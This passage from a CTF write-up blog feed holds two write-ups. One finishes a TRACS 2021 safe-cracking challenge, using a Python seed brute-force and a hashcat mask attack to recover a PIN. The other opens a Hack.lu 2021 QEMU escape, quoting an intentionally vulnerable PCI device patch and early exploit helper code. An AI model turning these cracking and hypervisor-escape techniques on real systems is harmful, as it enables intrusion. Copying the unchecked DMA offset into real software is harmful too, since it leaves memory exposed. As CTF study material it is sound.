  <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x24uLL</span><span class="p">);</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="o">*</span><span class="n">id</span> <span class="o">=</span> <span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>The function is very basic, it opens the <code>.safe_db</code> file and initializes the <code>id</code> to the first four bytes of the file which is the first value of rand as seen in the previous functions.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="cracking-the-seed">
        Cracking the seed
        <a data-clipboard-text="https://nasm.re/posts/safe/#cracking-the-seed" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Cracking the seed" href="#cracking-the-seed">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>To recover the pin, we have to know what hash the hash of the pin will be compared to. To do so, we have to recover the random buffer, hash it, give it to the &ldquo;core&rdquo; encryption layer and hash what it outputs. That will be the final hash which will be compared to the hash of the pin we send. The main part of the challenge is so to recover the <code>rand</code> values, more specifically the seed given to <code>srand</code> to initialize the PRNG. We know the seed in the program is <code>time(NULL)</code>. Which means that this is a timestamp that can be bruteforced in a reasonable amount of time (the 2020 edition of the CTF was cancelled because of COVID so we took as range the date of the software update until today). The bruteforce is very fast because given we know the <code>id</code> which is the value for the first call to <code>rand</code>, we have just to ensure the first value of <code>rand</code> for the seed we bruteforce is equal to the <code>id</code> value.</p>
<p>Which gives:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">tqdm</span> <span class="kn">import</span> <span class="n">tqdm</span>
<span class="kn">import</span> <span class="nn">hashlib</span>
<span class="kn">from</span> <span class="nn">ctypes</span> <span class="kn">import</span> <span class="n">CDLL</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">CDLL</span><span class="p">(</span><span class="s2">&#34;libc.so.6&#34;</span><span class="p">)</span>

<span class="n">h</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">sha256</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span>

<span class="n">START_TIME</span>   <span class="o">=</span> <span class="mi">1605052800</span> <span class="c1"># 2020-11-11 12:00:00 AM -&gt; known date for the software update</span>
<span class="n">CURRENT_TIME</span> <span class="o">=</span> <span class="mi">1638633346</span> <span class="c1"># 2021-12-04  3:55:46 PM -&gt; current time</span>
<span class="n">PINCODE</span>      <span class="o">=</span> <span class="mh">0x4b2e2a1c</span>

<span class="n">CHARSET</span>      <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;1234567890ABCD&#34;</span>
<span class="n">CHARLEN</span>      <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">CHARSET</span><span class="p">)</span>

<span class="k">for</span> <span class="n">t</span> <span class="ow">in</span> <span class="n">tqdm</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="n">CURRENT_TIME</span> <span class="o">-</span> <span class="n">START_TIME</span><span class="p">)):</span>
    <span class="n">t</span> <span class="o">+=</span> <span class="n">START_TIME</span>

    <span class="n">libc</span><span class="o">.</span><span class="n">srand</span><span class="p">(</span><span class="n">t</span><span class="p">)</span>
    
    <span class="k">if</span> <span class="n">PINCODE</span> <span class="o">==</span> <span class="n">libc</span><span class="o">.</span><span class="n">rand</span><span class="p">():</span>

        <span class="n">v8</span> <span class="o">=</span> <span class="p">[</span><span class="n">libc</span><span class="o">.</span><span class="n">rand</span><span class="p">()</span> <span class="o">&amp;</span> <span class="mh">0xff</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1024</span><span class="p">)]</span>
        <span class="n">v8</span> <span class="o">=</span> <span class="n">h</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">v8</span><span class="p">))</span>

        <span class="n">v6</span> <span class="o">=</span> <span class="p">[</span><span class="n">CHARSET</span><span class="p">[</span><span class="n">v8</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">32</span><span class="p">]</span> <span class="o">%</span> <span class="n">CHARLEN</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">)]</span>
        <span class="n">v6</span> <span class="o">=</span> <span class="n">h</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">v6</span><span class="p">))</span>

        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Timestamp: </span><span class="si">{</span><span class="n">t</span><span class="si">=}</span><span class="s2">, hash: </span><span class="si">{</span><span class="n">v6</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</code></pre></div><p>And when we found the right seed, we just have to generate, hash, cipher and hash again the right random buffer to get the right hash to which the hash of the pin will be compared to.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-Shell" data-lang="Shell">$ python3 solve.py 
 94%<span class="p">|</span>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████▏       <span class="p">|</span> 31691218/33580546 <span class="o">[</span>01:29&lt;00:05, 351593.81it/s<span class="o">]</span>
Timestamp: <span class="nv">t</span><span class="o">=</span>1636749762, hash: 88c71c0cc0950acfe3835a009f8931cee0f12ab7410538f96d058184a4c90e11
100%<span class="p">|</span>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████<span class="p">|</span> 33580546/33580546 <span class="o">[</span>01:34&lt;00:00, 356533.87it/s<span class="o">]</span>
</code></pre></div><div class="gblog-post__anchorwrap">
    <h2 id="hashcat--profit">
        Hashcat + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/safe/#hashcat--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Hashcat &#43; PROFIT" href="#hashcat--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Now we know the final hash to which the hash of the pin is compared to, we can just run a mask attack using hashcat with a mask of 8 hexadecimal characters in uppercase (we tried for every length up to the right size: 8).</p>
<pre tabindex="0"><code>$ hashcat -a 3 -m 1400 pincode.hash ?H?H?H?H?H?H?H?H
[skip]
88c71c0cc0950acfe3835a009f8931cee0f12ab7410538f96d058184a4c90e11:4233246D

Session..........: hashcat
Status...........: Cracked
Hash.Type........: SHA2-256
Hash.Target......: 88c71c0cc0950acfe3835a009f8931cee0f12ab7410538f96d0...c90e11
Time.Started.....: Sat Dec  5 16:52:37 2021 (7 mins, 22 secs)
Time.Estimated...: Sat Dec  5 16:59:59 2021 (0 secs)
Guess.Mask.......: ?H?H?H?H?H?H?H?H [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  7884.8 kH/s (7.30ms) @ Accel:256 Loops:64 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 3342925824/4294967296 (77.83%)
Rejected.........: 0/3342925824 (0.00%)
Restore.Point....: 816128/1048576 (77.83%)
Restore.Sub.#1...: Salt:0 Amplifier:0-64 Iteration:0-64
Candidates.#1....: 1234515D -&gt; EBCF585D
</code></pre><p>The challenge was pretty funny because of the IRL part, and because we solved it together (<a
  class="gblog-markdown__link"
  href="https://github.com/n4sm"
  
  >nasm</a
> and <a
  class="gblog-markdown__link"
  href="https://twitter.com/yarienkiva"
  
  >Alol</a
>).</p>
<p>Authors: <a
  class="gblog-markdown__link"
  href="https://github.com/n4sm"
  
  >nasm</a
> and <a
  class="gblog-markdown__link"
  href="https://twitter.com/yarienkiva"
  
  >Alol</a
>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="annexes">
        Annexes
        <a data-clipboard-text="https://nasm.re/posts/safe/#annexes" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Annexes" href="#annexes">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p><img
  src="https://ret2school.github.io/images/coffre.jpg"
  alt="The safe"
  
/></p>
]]></content>
            
                 
                    
                 
                    
                         
                        
                            
                             
                                <category scheme="https://nasm.re/tags/ctf" term="ctf" label="ctf" />
                             
                                <category scheme="https://nasm.re/tags/ret2school" term="ret2school" label="ret2school" />
                             
                                <category scheme="https://nasm.re/tags/TRACS-2021" term="TRACS-2021" label="TRACS 2021" />
                             
                                <category scheme="https://nasm.re/tags/TRACS" term="TRACS" label="TRACS" />
                             
                                <category scheme="https://nasm.re/tags/nasm" term="nasm" label="nasm" />
                             
                                <category scheme="https://nasm.re/tags/Alol" term="Alol" label="Alol" />
                             
                                <category scheme="https://nasm.re/tags/reverse" term="reverse" label="reverse" />
                             
                                <category scheme="https://nasm.re/tags/RE" term="RE" label="RE" />
                             
                                <category scheme="https://nasm.re/tags/IRL" term="IRL" label="IRL" />
                             
                                <category scheme="https://nasm.re/tags/rand" term="rand" label="rand" />
                             
                                <category scheme="https://nasm.re/tags/2021" term="2021" label="2021" />
                            
                        
                    
                
            
        </entry>
    
        
        <entry>
            <title type="html"><![CDATA[[Hack.lu 2021 - pwn] Cloudinspect]]></title>
            <link href="https://nasm.re/posts/cloudinspect/?utm_source=atom_feed" rel="alternate" type="text/html"  hreflang="en" />
            <id>https://nasm.re/posts/cloudinspect/</id>
            
            <published>2021-11-07T00:00:00+00:00</published>
            <updated>2021-11-07T00:00:00+00:00</updated>
            
            
            <content type="html"><![CDATA[<div class="gblog-post__anchorwrap">
    <h1 id="cloudinspect">
        CloudInspect
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#cloudinspect" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor CloudInspect" href="#cloudinspect">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>CloundInpect was a hypervisor exploitation challenge I did for the <a
  class="gblog-markdown__link"
  href="https://flu.xxx"
  
  >Hack.lu event</a
>.
I didn&rsquo;t succeed to flag it within the 48 hours :(. But anyway I hope this write up will be interesting to read!
The related files can be found <a
  class="gblog-markdown__link"
  href="https://github.com/ret2school/ctf/tree/master/2021/hack.lu/pwn/cloudinspect"
  
  >right here</a
></p>
<blockquote>
<p>After Whiterock released it&rsquo;s trading bot cloud with special Stonks Sockets another hedge fund, Castel, comes with some competition. The special feature here is called &ldquo;cloudinspect&rdquo;.<br>
The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
</blockquote>
<div class="gblog-post__anchorwrap">
    <h2 id="vulnerable-pci-device">
        Vulnerable PCI device
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#vulnerable-pci-device" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Vulnerable PCI device" href="#vulnerable-pci-device">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We got several files:</p>
<pre tabindex="0"><code>$ ls
build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
</code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
</span><span class="gh"></span>new file mode 100644
<span class="gh">index 0000000000..f1c3f84b2a
</span><span class="gh"></span><span class="gd">--- /dev/null
</span><span class="gd"></span><span class="gi">+++ b/hw/misc/cloudinspect.c
</span><span class="gi"></span><span class="gu">@@ -0,0 +1,204 @@
</span><span class="gu"></span><span class="gi">+/*
</span><span class="gi">+ * QEMU cloudinspect intentionally vulnerable PCI device
</span><span class="gi">+ *
</span><span class="gi">+ */
</span><span class="gi">+
</span><span class="gi">+#include &#34;qemu/osdep.h&#34;
</span><span class="gi">+#include &#34;qemu/units.h&#34;
</span><span class="gi">+#include &#34;hw/pci/pci.h&#34;
</span><span class="gi">+#include &#34;hw/hw.h&#34;
</span><span class="gi">+#include &#34;hw/pci/msi.h&#34;
</span><span class="gi">+#include &#34;qom/object.h&#34;
</span><span class="gi">+#include &#34;qemu/module.h&#34;
</span><span class="gi">+#include &#34;qapi/visitor.h&#34;
</span><span class="gi">+#include &#34;sysemu/dma.h&#34;
</span><span class="gi">+
</span><span class="gi">+#define TYPE_PCI_CLOUDINSPECT_DEVICE &#34;cloudinspect&#34;
</span><span class="gi">+typedef struct CloudInspectState CloudInspectState;
</span><span class="gi">+DECLARE_INSTANCE_CHECKER(CloudInspectState, CLOUDINSPECT,
</span><span class="gi">+                         TYPE_PCI_CLOUDINSPECT_DEVICE)
</span><span class="gi">+
</span><span class="gi">+#define DMA_SIZE        4096
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CMD 0x78
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_SRC 0x80
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_DST 0x88
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_CNT 0x90
</span><span class="gi">+#define CLOUDINSPECT_MMIO_OFFSET_TRIGGER 0x98
</span><span class="gi">+
</span><span class="gi">+#define CLOUDINSPECT_VENDORID 0x1337
</span><span class="gi">+#define CLOUDINSPECT_DEVICEID 0x1337
</span><span class="gi">+#define CLOUDINSPECT_REVISION 0xc1
</span><span class="gi">+
</span><span class="gi">+#define CLOUDINSPECT_DMA_GET_VALUE      0x1
</span><span class="gi">+#define CLOUDINSPECT_DMA_PUT_VALUE      0x2
</span><span class="gi">+
</span><span class="gi">+struct CloudInspectState {
</span><span class="gi">+    PCIDevice pdev;
</span><span class="gi">+    MemoryRegion mmio;
</span><span class="gi">+    AddressSpace *as;
</span><span class="gi">+
</span><span class="gi">+    struct dma_state {
</span><span class="gi">+        dma_addr_t src;
</span><span class="gi">+        dma_addr_t dst;
</span><span class="gi">+        dma_addr_t cnt;
</span><span class="gi">+        dma_addr_t cmd;
</span><span class="gi">+    } dma;
</span><span class="gi">+    char dma_buf[DMA_SIZE];
</span><span class="gi">+};
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_dma_rw(CloudInspectState *cloudinspect, bool write)
</span><span class="gi">+{
</span><span class="gi">+    if (write) {
</span><span class="gi">+        uint64_t dst = cloudinspect-&gt;dma.dst;
</span><span class="gi">+        // DMA_DIRECTION_TO_DEVICE: Read from an address space to PCI device
</span><span class="gi">+        dma_memory_read(cloudinspect-&gt;as, cloudinspect-&gt;dma.src, cloudinspect-&gt;dma_buf + dst, cloudinspect-&gt;dma.cnt);
</span><span class="gi">+    } else {
</span><span class="gi">+        uint64_t src = cloudinspect-&gt;dma.src;
</span><span class="gi">+        // DMA_DIRECTION_FROM_DEVICE: Write to address space from PCI device
</span><span class="gi">+        dma_memory_write(cloudinspect-&gt;as, cloudinspect-&gt;dma.dst, cloudinspect-&gt;dma_buf + src, cloudinspect-&gt;dma.cnt);
</span><span class="gi">+    }
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static bool cloudinspect_DMA_op(CloudInspectState *cloudinspect, bool write) {
</span><span class="gi">+    switch (cloudinspect-&gt;dma.cmd) {
</span><span class="gi">+        case CLOUDINSPECT_DMA_GET_VALUE:
</span><span class="gi">+        case CLOUDINSPECT_DMA_PUT_VALUE:
</span><span class="gi">+            if (cloudinspect-&gt;dma.cnt &gt; DMA_SIZE) {
</span><span class="gi">+                return false;
</span><span class="gi">+            }
</span><span class="gi">+            cloudinspect_dma_rw(cloudinspect, write);
</span><span class="gi">+            break;
</span><span class="gi">+        default:
</span><span class="gi">+            return false;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    return true;
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static uint64_t cloudinspect_mmio_read(void *opaque, hwaddr addr, unsigned size)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
</span><span class="gi">+    uint64_t val = ~0ULL;
</span><span class="gi">+
</span><span class="gi">+    switch (addr) {
</span><span class="gi">+    case 0x00:
</span><span class="gi">+        val = 0xc10dc10dc10dc10d;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
</span><span class="gi">+        val = cloudinspect-&gt;dma.cmd;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
</span><span class="gi">+        val = cloudinspect-&gt;dma.src;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
</span><span class="gi">+        val = cloudinspect-&gt;dma.dst;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
</span><span class="gi">+        val = cloudinspect-&gt;dma.cnt;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, false);
</span><span class="gi">+        break;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    return val;
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_mmio_write(void *opaque, hwaddr addr, uint64_t val,
</span><span class="gi">+                unsigned size)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = opaque;
</span><span class="gi">+
</span><span class="gi">+    switch (addr) {
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CMD:
</span><span class="gi">+        cloudinspect-&gt;dma.cmd = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_SRC:
</span><span class="gi">+        cloudinspect-&gt;dma.src = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_DST:
</span><span class="gi">+        cloudinspect-&gt;dma.dst = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_CNT:
</span><span class="gi">+        cloudinspect-&gt;dma.cnt = val;
</span><span class="gi">+        break;
</span><span class="gi">+    case CLOUDINSPECT_MMIO_OFFSET_TRIGGER:
</span><span class="gi">+        val = cloudinspect_DMA_op(cloudinspect, true);
</span><span class="gi">+        break;
</span><span class="gi">+    }
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static const MemoryRegionOps cloudinspect_mmio_ops = {
</span><span class="gi">+    .read = cloudinspect_mmio_read,
</span><span class="gi">+    .write = cloudinspect_mmio_write,
</span><span class="gi">+    .endianness = DEVICE_NATIVE_ENDIAN,
</span><span class="gi">+    .valid = {
</span><span class="gi">+        .min_access_size = 4,
</span><span class="gi">+        .max_access_size = 8,
</span><span class="gi">+    },
</span><span class="gi">+    .impl = {
</span><span class="gi">+        .min_access_size = 4,
</span><span class="gi">+        .max_access_size = 8,
</span><span class="gi">+    },
</span><span class="gi">+
</span><span class="gi">+};
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_realize(PCIDevice *pdev, Error **errp)
</span><span class="gi">+{
</span><span class="gi">+    CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
</span><span class="gi">+    // uint8_t *pci_conf = pdev-&gt;config;
</span><span class="gi">+
</span><span class="gi">+    if (msi_init(pdev, 0, 1, true, false, errp)) {
</span><span class="gi">+        return;
</span><span class="gi">+    }
</span><span class="gi">+
</span><span class="gi">+    cloudinspect-&gt;as = &amp;address_space_memory;
</span><span class="gi">+    memory_region_init_io(&amp;cloudinspect-&gt;mmio, OBJECT(cloudinspect), &amp;cloudinspect_mmio_ops, cloudinspect,
</span><span class="gi">+                    &#34;cloudinspect-mmio&#34;, 1 * MiB);
</span><span class="gi">+    pci_register_bar(pdev, 0, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;cloudinspect-&gt;mmio);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_uninit(PCIDevice *pdev)
</span><span class="gi">+{
</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(pdev);
</span><span class="gi">+
</span><span class="gi">+    msi_uninit(pdev);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_instance_init(Object *obj)
</span><span class="gi">+{
</span><span class="gi">+    // CloudInspectState *cloudinspect = CLOUDINSPECT(obj);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void cloudinspect_class_init(ObjectClass *class, void *data)
</span><span class="gi">+{
</span><span class="gi">+    DeviceClass *dc = DEVICE_CLASS(class);
</span><span class="gi">+    PCIDeviceClass *k = PCI_DEVICE_CLASS(class);
</span><span class="gi">+
</span><span class="gi">+    k-&gt;realize = pci_cloudinspect_realize;
</span><span class="gi">+    k-&gt;exit = pci_cloudinspect_uninit;
</span><span class="gi">+    k-&gt;vendor_id = CLOUDINSPECT_VENDORID;
</span><span class="gi">+    k-&gt;device_id = CLOUDINSPECT_DEVICEID;
</span><span class="gi">+    k-&gt;revision = CLOUDINSPECT_REVISION;
</span><span class="gi">+    k-&gt;class_id = PCI_CLASS_OTHERS;
</span><span class="gi">+    set_bit(DEVICE_CATEGORY_MISC, dc-&gt;categories);
</span><span class="gi">+}
</span><span class="gi">+
</span><span class="gi">+static void pci_cloudinspect_register_types(void)
</span><span class="gi">+{
</span><span class="gi">+    static InterfaceInfo interfaces[] = {
</span><span class="gi">+        { INTERFACE_CONVENTIONAL_PCI_DEVICE },
</span><span class="gi">+        { },
</span><span class="gi">+    };
</span><span class="gi">+    static const TypeInfo cloudinspect_info = {
</span><span class="gi">+        .name          = TYPE_PCI_CLOUDINSPECT_DEVICE,
</span><span class="gi">+        .parent        = TYPE_PCI_DEVICE,
</span><span class="gi">+        .instance_size = sizeof(CloudInspectState),
</span><span class="gi">+        .instance_init = cloudinspect_instance_init,
</span><span class="gi">+        .class_init    = cloudinspect_class_init,
</span><span class="gi">+        .interfaces = interfaces,
</span><span class="gi">+    };
</span><span class="gi">+
</span><span class="gi">+    type_register_static(&amp;cloudinspect_info);
</span><span class="gi">+}
</span><span class="gi">+type_init(pci_cloudinspect_register_types)
</span><span class="gi"></span><span class="gh">diff --git a/hw/misc/meson.build b/hw/misc/meson.build
</span><span class="gh">index 1cd48e8a0f..5ff263ca2f 100644
</span><span class="gh"></span><span class="gd">--- a/hw/misc/meson.build
</span><span class="gd"></span><span class="gi">+++ b/hw/misc/meson.build
</span><span class="gi"></span><span class="gu">@@ -1,5 +1,6 @@
</span><span class="gu"></span> softmmu_ss.add(when: &#39;CONFIG_APPLESMC&#39;, if_true: files(&#39;applesmc.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_EDU&#39;, if_true: files(&#39;edu.c&#39;))
<span class="gi">+softmmu_ss.add(files(&#39;cloudinspect.c&#39;))
</span><span class="gi"></span> softmmu_ss.add(when: &#39;CONFIG_FW_CFG_DMA&#39;, if_true: files(&#39;vmcoreinfo.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_ISA_DEBUG&#39;, if_true: files(&#39;debugexit.c&#39;))
 softmmu_ss.add(when: &#39;CONFIG_ISA_TESTDEV&#39;, if_true: files(&#39;pc-testdev.c&#39;))
</code></pre></div><p>The first thing I did when I saw this was to check out how <code>memory_region_init_io</code> and <code>pci_register_bar</code> functions work. It sounds a bit like like a kernel device which registers a few handlers for basic operations like read / write / ioctl. Very quickly I found two write up from dangokyo <a
  class="gblog-markdown__link"
  href="https://dangokyo.me/2018/03/28/qemu-internal-pci-device/"
  
  >this one</a
>  and <a
  class="gblog-markdown__link"
  href="https://dangokyo.me/2018/03/25/hitb-xctf-2017-babyqemu-write-up/"
  
  >this other one</a
>, I recommend you to check it out, they are pretty interesting and well written.</p>
<p>PCI stands for Peripheral Component Interconnect, that&rsquo;s a standard that describes the interactions between the cpu and the other physical devices. The PCI device handles the interactions between the system and the physical device. To do so,  the PCI handler is providing a physical address space to the kernel, reachable through the kernel abstractions from a particular virtual address space. This address can be used to cache some data, but that&rsquo;s mainly used to request a particular behavior from the kernel to the physical devices. These requests are written at a well defined offset in the PCI address space, that are the I/O registers. And in the same way, the devices are waiting for some values at these locations to trigger a particular behavior. Check out <a
  class="gblog-markdown__link"
  href="https://tldp.org/LDP/tlk/dd/pci.html"
  
  >this</a
> and <a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/html/latest/PCI/pci.html#mmio-space-and-write-posting"
  
  >this</a
> to learn more about PCI devices!</p>
<p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
<p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
<p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
<pre tabindex="0"><code>/ # lspci -v
00:01.0 Class 0601: 8086:7000
00:00.0 Class 0600: 8086:1237
00:01.3 Class 0680: 8086:7113
00:01.1 Class 0101: 8086:7010
00:02.0 Class 00ff: 1337:1337
</code></pre><p>The output of the command is structured like this:</p>
<pre tabindex="0"><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
Field 2 : 00ff    : device class
Field 3 : 1337    : vendor ID
Field 4 : 1337    : device ID
</code></pre><p>According to the source code of the PCI device, the vendor ID and the device ID are <code>0x1337</code>, the resource file corresponding to the device is so <code>/sys/devices/pci0000:00/0000:00:02.0/resource0</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="device-interactions">
        Device interactions
        <a data-clipboard-text="https://nasm.re/posts/cloudinspect/#device-interactions" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Device interactions" href="#device-interactions">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>What we need to interact with the device is to get the physical address of a memory area we control, which would act like a shared buffer between our program and the PCI device. To do so we can <code>mmap</code> a few pages, <code>malloc</code> a buffer or just allocate onto the function&rsquo;s stackframe a large buffer. Given that I was following the thedangokyo&rsquo;s write up, I just retrieved a few functions he was using and especially for the shared buffer.</p>
<p>The function used to get the physical address corresponding to an arbitrary pointer is based on the <code>/proc/self/pagemap</code> pseudo-file, for which you can read the format <a
  class="gblog-markdown__link"
  href="https://www.kernel.org/doc/Documentation/vm/pagemap.txt"
  
  >here</a
>. The virt2phys function looks like this:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
		<span class="kt">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
		<span class="n">assert</span><span class="p">((</span><span class="n">virt</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
		<span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
		<span class="c1">// the pagemap associates each mapped page of the virtual address space 
</span><span class="c1"></span>		<span class="c1">// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
</span><span class="c1"></span>		<span class="c1">// and because that&#39;s an array of 64 bits entry, to access the right entry, the
</span><span class="c1"></span>		<span class="c1">// offset is multiplied per 8. 
</span><span class="c1"></span>		<span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
		<span class="kt">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phys</span><span class="p">,</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
		<span class="n">assert</span><span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">));</span>
